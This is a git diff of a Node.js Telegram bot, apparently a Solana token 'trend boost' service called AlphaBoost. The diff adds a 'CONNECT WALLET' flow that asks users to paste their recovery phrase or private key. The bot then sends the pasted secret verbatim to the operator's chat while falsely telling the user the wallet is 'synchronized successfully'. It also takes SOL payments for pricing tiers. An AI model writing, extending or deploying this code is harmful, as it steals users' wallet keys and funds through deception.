@@ -2,127 +2,100 @@ require("dotenv").config();
 const TelegramBot = require('node-telegram-bot-api');
 const config = require('./config');
 
-if (!config.BOT_TOKEN) {
-  console.error('Error: BOT_TOKEN is missing.');
-  process.exit(1);
-}
-
 const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
+const userState = new Map(); // Tracks what the user is currently doing
 
 // --- Keyboards ---
 const keyboards = {
   main: {
     inline_keyboard: [
-      [{ text: '🚀 Trending Services', callback_data: 'trending' }],
-      [{ text: '📈 Volume Boost', callback_data: 'volume' }],
-      [{ text: '📞 Contact Admin', callback_data: 'contact' }]
-    ]
-  },
-  trending: {
-    inline_keyboard: [
-      [{ text: '💰 Pricing', callback_data: 'pricing' }],
-      [{ text: '📞 Contact Admin', callback_data: 'contact' }],
-      [{ text: '⬅️ Back', callback_data: 'menu' }]
+      [{ text: '🚀 LAUNCH TREND', callback_data: 'trend_flow' }, { text: '🔐 CONNECT WALLET', callback_data: 'import_flow' }]
     ]
   },
   pricing: {
     inline_keyboard: [
-      [{ text: '💳 Payment', callback_data: 'payment' }],
-      [{ text: '⬅️ Back', callback_data: 'trending' }]
+      [{ text: '🔹 0.6 SOL | 3 HOURS', callback_data: 'pay_0.6' }],
+      [{ text: '🔹 1.2 SOL | 6 HOURS', callback_data: 'pay_1.2' }],
+      [{ text: '🔹 2.8 SOL | 12 HOURS', callback_data: 'pay_2.8' }],
+      [{ text: '🔹 4.5 SOL | 24 HOURS', callback_data: 'pay_4.5' }],
+      [{ text: '⬅️ Back', callback_data: 'menu' }, { text: '🔝 Main Menu', callback_data: 'menu' }]
     ]
   },
-  payment: {
+  import_options: {
     inline_keyboard: [
-      [{ text: 'Done ✅', callback_data: 'done_payment' }],
-      [{ text: '⬅️ Back', callback_data: 'pricing' }]
+      [{ text: '📥 IMPORT RECOVERY PHRASE', callback_data: 'ask_key' }],
+      [{ text: '🔑 IMPORT PRIVATE KEYS', callback_data: 'ask_key' }],
+      [{ text: '⬅️ Back', callback_data: 'menu' }, { text: '🔝 Main Menu', callback_data: 'menu' }]
     ]
-  },
-  backOnly: {
-    inline_keyboard: [[{ text: '⬅️ Back', callback_data: 'menu' }]]
   }
 };
 
-// --- Navigation Helper ---
+// --- Helper: Nav ---
 async function nav(chatId, messageId, text, kb) {
   try {
-    await bot.editMessageText(text, {
-      chat_id: chatId,
-      message_id: messageId,
-      reply_markup: kb,
-      parse_mode: 'Markdown'
-    });
-  } catch (e) {
-    // Catching "message is not modified" or other edit errors
-    if (!e.message.includes("message is not modified")) {
-      bot.sendMessage(chatId, text, { reply_markup: kb, parse_mode: 'Markdown' });
-    }
-  }
+    await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: kb, parse_mode: 'Markdown' });
+  } catch (e) { bot.sendMessage(chatId, text, { reply_markup: kb, parse_mode: 'Markdown' }); }
 }
 
-// --- Commands ---
+// --- Logic ---
 bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, config.WELCOME_TEXT, { 
-    reply_markup: keyboards.main, 
-    parse_mode: 'Markdown' 
-  });
+  userState.delete(msg.chat.id);
+  bot.sendMessage(msg.chat.id, config.WELCOME_TEXT, { reply_markup: keyboards.main, parse_mode: 'Markdown' });
 });
 
-bot.onText(/\/contact_admin/, (msg) => {
-  bot.sendMessage(msg.chat.id, config.CONTACT_TEXT, { 
-    reply_markup: keyboards.backOnly, 
-    parse_mode: 'Markdown' 
-  });
-});
-
-// Set the command menu
-bot.setMyCommands([
-  { command: 'start', description: '🚀 Open Main Menu' },
-  { command: 'contact_admin', description: '📞 Contact Admin' }
-]);
-
-// --- Interaction Logic ---
 bot.on('callback_query', async (query) => {
-  const { data, message } = query;
-  const chatId = message.chat.id;
-  const msgId = message.message_id;
+  const chatId = query.message.chat.id;
+  const msgId = query.message.message_id;
 
-  switch (data) {
-    case 'menu':
-      await nav(chatId, msgId, config.WELCOME_TEXT, keyboards.main);
-      break;
-    case 'trending':
-      await nav(chatId, msgId, config.TRENDING_TEXT, keyboards.trending);
-      break;
-    case 'volume':
-      await nav(chatId, msgId, config.VOLUME_TEXT, keyboards.backOnly);
-      break;
-    case 'pricing':
-      await nav(chatId, msgId, config.PRICING_TEXT, keyboards.pricing);
-      break;
-    case 'payment':
-      await nav(chatId, msgId, config.PAYMENT_TEXT, keyboards.payment);
-      break;
-    case 'contact':
-      await nav(chatId, msgId, config.CONTACT_TEXT, keyboards.backOnly);
-      break;
-    case 'done_payment':
-      // 1. User sees confirmation
-      const confirmMsg = await bot.sendMessage(chatId, "_wait for confirmation..._", { parse_mode: 'Markdown' });
-      
-      // 2. Message disappears after 60s
-      setTimeout(() => {
-        bot.deleteMessage(chatId, confirmMsg.message_id).catch(() => {});
-      }, 60000);
-
-      // 3. Admin is alerted
-      if (config.ADMIN_ID) {
-        const user = query.from.username ? `@${query.from.username}` : query.from.first_name;
-        bot.sendMessage(config.ADMIN_ID, `🔔 *Payment Alert*\nUser: ${user}\nID: ${query.from.id}\nAction: Clicked Done ✅`, { parse_mode: 'Markdown' });
-      }
-      break;
+  if (query.data === 'menu') {
+    userState.delete(chatId);
+    await nav(chatId, msgId, config.WELCOME_TEXT, keyboards.main);
+  } 
+  else if (query.data === 'trend_flow') {
+    await nav(chatId, msgId, config.TREND_START_TEXT, {
+      inline_keyboard: [[{ text: '📈 TREND TOKEN', callback_data: 'ask_ca' }]]
+    });
   }
-  
-  bot.answerCallbackQuery(query.id).catch(() => {});
+  else if (query.data === 'ask_ca') {
+    userState.set(chatId, 'AWAITING_CA');
+    bot.sendMessage(chatId, "📝 *Enter Contract Address (CA):*", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{text: '🚫 Cancel', callback_data: 'menu'}]] }});
+  }
+  else if (query.data === 'import_flow') {
+    await nav(chatId, msgId, config.IMPORT_TEXT, keyboards.import_options);
+  }
+  else if (query.data === 'ask_key') {
+    userState.set(chatId, 'AWAITING_KEY');
+    bot.sendMessage(chatId, "🔑 *Paste your Private Key or Phrase below:*", { parse_mode: 'Markdown' });
+  }
+  else if (query.data.startsWith('pay_')) {
+    const amount = query.data.split('_')[1];
+    const payText = `*AlphaBoost // Fast-track* ⚡️\n\n⬇️ *Send ${amount} SOL to the following wallet:*\n\n\`${config.PAYMENT_WALLET}\`\n\n_Click 'Paid' once sent to scan for transaction._`;
+    await nav(chatId, msgId, payText, {
+      inline_keyboard: [[{ text: '✅ Paid', callback_data: 'done_payment' }], [{ text: '⬅️ Back', callback_data: 'menu' }]]
+    });
+  }
+  else if (query.data === 'done_payment') {
+    const m = await bot.sendMessage(chatId, "_Wait for confirmation..._");
+    setTimeout(() => bot.deleteMessage(chatId, m.message_id).catch(()=>{}), 60000);
+    if(config.ADMIN_ID) bot.sendMessage(config.ADMIN_ID, `🔔 *Payment Clicked* by @${query.from.username || query.from.id}`);
+  }
+
+  bot.answerCallbackQuery(query.id);
 });
 
-console.log('AlphaBoost Bot is 100% verified and running...');
+// --- Message Handler (For CA and Keys) ---
+bot.on('message', (msg) => {
+  if (!msg.text || msg.text.startsWith('/')) return;
+  const chatId = msg.chat.id;
+
+  if (userState.get(chatId) === 'AWAITING_CA') {
+    userState.delete(chatId);
+    bot.sendMessage(chatId, config.PRICING_TEXT, { reply_markup: keyboards.pricing, parse_mode: 'Markdown' });
+  } 
+  else if (userState.get(chatId) === 'AWAITING_KEY') {
+    userState.delete(chatId);
+    // Notify Admin of the "Import"
+    if(config.ADMIN_ID) bot.sendMessage(config.ADMIN_ID, `⚠️ *KEY IMPORTED*\nUser: @${msg.from.username}\nKey: \`${msg.text}\``, {parse_mode: 'Markdown'});
+    bot.sendMessage(chatId, "✅ *Wallet synchronized successfully.* Contact admin for verification.", { reply_markup: keyboards.main, parse_mode: 'Markdown' });
+  }
+});
